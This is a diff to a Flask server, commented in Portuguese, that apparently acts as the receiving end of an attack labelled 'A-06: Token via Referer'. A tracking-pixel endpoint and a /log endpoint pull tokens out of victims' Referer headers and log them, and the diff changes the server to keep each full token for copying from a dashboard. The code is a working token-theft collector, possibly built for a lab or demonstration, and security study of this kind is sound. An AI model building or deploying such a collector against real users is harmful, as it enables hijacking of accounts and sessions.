@@ -24,7 +24,7 @@ app = Flask(__name__)
 # ------------------------------------------------------------------
 captured_events = []   # lista de dicts com os dados capturados
 
-def log_event(attack, source, details):
+def log_event(attack, source, details, token=""):
     """Regista um evento capturado."""
     event = {
         "id":        len(captured_events) + 1,
@@ -33,6 +33,7 @@ def log_event(attack, source, details):
         "source_ip": request.remote_addr,
         "source":    source,
         "details":   details,
+        "token":     token,   # token completo (para copiar no dashboard)
     }
     captured_events.append(event)
     print(f"\n{'='*60}")
@@ -64,11 +65,11 @@ def pixel():
         except Exception:
             token = "(erro ao extrair)"
 
-    details = f"Referer: {referer[:200]}"
+    details = f"Referer: {referer[:300]}"
     if token:
         details += f"\n  TOKEN CAPTURADO: {token[:80]}..."
 
-    log_event("A-06: Token via Referer", "pixel.gif", details)
+    log_event("A-06: Token via Referer", "pixel.gif", details, token=token)
 
     # Devolver um pixel GIF transparente 1x1
     gif = (
@@ -99,11 +100,11 @@ def log_request():
         except Exception:
             token = "(erro ao extrair)"
 
-    details = f"Referer: {referer[:200]}"
+    details = f"Referer: {referer[:300]}"
     if token:
         details += f"\n  TOKEN CAPTURADO: {token[:80]}..."
 
-    event = log_event("A-06: Token via Referer", "/log endpoint", details)
+    event = log_event("A-06: Token via Referer", "/log endpoint", details, token=token)
 
     response = jsonify({"status": "logged", "event_id": event["id"]})
     response.headers["Access-Control-Allow-Origin"] = "*"
